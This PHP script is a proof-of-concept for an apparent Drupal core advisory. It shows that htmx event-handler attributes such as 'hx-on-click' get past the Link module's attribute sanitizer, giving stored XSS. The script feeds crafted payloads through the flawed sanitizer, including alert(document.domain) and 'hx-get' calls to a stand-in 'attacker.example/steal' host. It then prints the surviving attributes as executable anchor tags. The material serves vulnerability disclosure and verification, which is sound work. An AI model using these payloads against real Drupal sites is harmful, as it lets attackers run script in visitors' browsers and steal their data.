<?php
/**
 * Standalone PoC — SA-CORE-2026-015 / CVE-2026-108515
 * Drupal core 11.4.9 — htmx event-handler attributes survive the Link module's
 * attribute sanitizer, giving stored XSS.
 *
 * Root cause (core/modules/link/src/AttributeXss.php:41-48):
 *
 *     $skip = (
 *       $attribute_name == 'style' ||
 *       str_starts_with($attribute_name, 'on') ||
 *       str_starts_with($attribute_name, '-') ||     <-- no 'hx' / 'data-hx'
 *       strlen($attribute_name) > 96
 *     );
 *
 * Drupal ships htmx 2.0.4 (core/core.libraries.yml:845) and htmx treats
 * "hx-on-<event>" and "data-hx-on-<event>" attributes as INLINE JAVASCRIPT
 * event handlers (core/assets/vendor/htmx/htmx.js:2916-2936). htmx is
 * enabled by default because big_pipe is a standard-profile dependency
 * (core/profiles/standard/standard.info.yml:23) and big_pipe attaches
 * core/htmx (core/modules/big_pipe/big_pipe.libraries.yml:9-11).
 *
 * The same sanitizer exists upstream in Drupal\Component\Utility\Xss and IS
 * correct there (core/lib/Drupal/Component/Utility/Xss.php:297-306): it
 * skips "hx" and "data-hx". The Link module's copy-paste fork simply never
 * received that hardening.
 *
 * This PoC needs no database, no web server and no Drupal kernel.
 *
 * Usage:
 *   php f2_attribute_xss.php [/path/to/drupal-11.4.9]
 */

$root = $argv[1] ?? getenv('DRUPAL_ROOT') ?: '/home/hax0r/Downloads/drupal-11.4.9';
if (!is_file($root . '/core/modules/link/src/AttributeXss.php')) {
  fwrite(STDERR, "ERROR: '$root' does not look like a Drupal core tree.\n");
  exit(1);
}

require __DIR__ . '/drupal_core_autoload.php';

use Drupal\link\AttributeXss;

$version = '';
if (preg_match("/const VERSION = '([^']+)'/", (string) file_get_contents($root . '/core/lib/Drupal.php'), $m)) {
  $version = $m[1];
}
echo "Target Drupal core : $root ($version)\n";
echo "Vulnerable sink    : core/modules/link/src/AttributeXss.php:41-48\n";
echo "Upstream (correct) : core/lib/Drupal/Component/Utility/Xss.php:297-306\n\n";

// ---------------------------------------------------------------------------
// 1. What the Link module's sanitizer does with each attribute name.
// ---------------------------------------------------------------------------
$cases = [
  'hx-on-click' => 'alert(document.domain)',
  'data-hx-on-click' => 'alert(document.domain)',
  'hx-on-htmx-config-request' => 'alert(1)',
  'hx-get' => 'https://attacker.example/steal',
  'data-hx-get' => 'https://attacker.example/steal',
  'onclick' => 'alert(1)',
  'onerror' => 'alert(1)',
  'style' => 'x:expression(alert(1))',
  'hx-on:click' => 'alert(1)',
];

printf("%-28s %-8s %s\n", 'ATTRIBUTE NAME', 'KEPT?', 'SANITISED RESULT');
echo str_repeat('-', 96), "\n";
$survived = [];
foreach ($cases as $name => $value) {
  $out = AttributeXss::sanitizeAttributes([$name => $value]);
  $kept = array_key_exists($name, $out);
  if ($kept) {
    $survived[$name] = $out[$name];
  }
  printf("%-28s %-8s %s\n", $name, $kept ? 'KEPT' : 'blocked', json_encode($out));
}

// ---------------------------------------------------------------------------
// 2. The same input through the UPSTREAM sanitizer, for comparison.
//    Xss::attributes() is protected, so it is reached by reflection.
// ---------------------------------------------------------------------------
$reflection = new \ReflectionMethod(\Drupal\Component\Utility\Xss::class, 'attributes');
$reflection->setAccessible(TRUE);
$upstream = $reflection->invoke(NULL, 'hx-on-click="alert(document.domain)"');
echo "\nUpstream Drupal\\Component\\Utility\\Xss::attributes('hx-on-click=...')\n";
echo '  => ' . json_encode($upstream) . "\n";
echo "  (empty array = upstream blocks it; the Link module fork does not)\n";

// ---------------------------------------------------------------------------
// 3. Verdict.
// ---------------------------------------------------------------------------
$dangerous = array_intersect_key($survived, array_flip(['hx-on-click', 'data-hx-on-click', 'hx-on-htmx-config-request']));
echo "\n=== RESULT ===\n";
if ($dangerous) {
  echo "VULNERABLE: the following htmx event-handler attributes survive the Link\n";
  echo "module's attribute sanitizer and are emitted into the page:\n";
  foreach ($dangerous as $name => $value) {
    echo "  <a {$name}=\"" . $value . "\">\n";
  }
  echo "htmx 2.0.4 (shipped by Drupal core) executes these as inline JS.\n";
  exit(0);
}
echo "NOT reproduced: htmx attributes were blocked.\n";
exit(1);
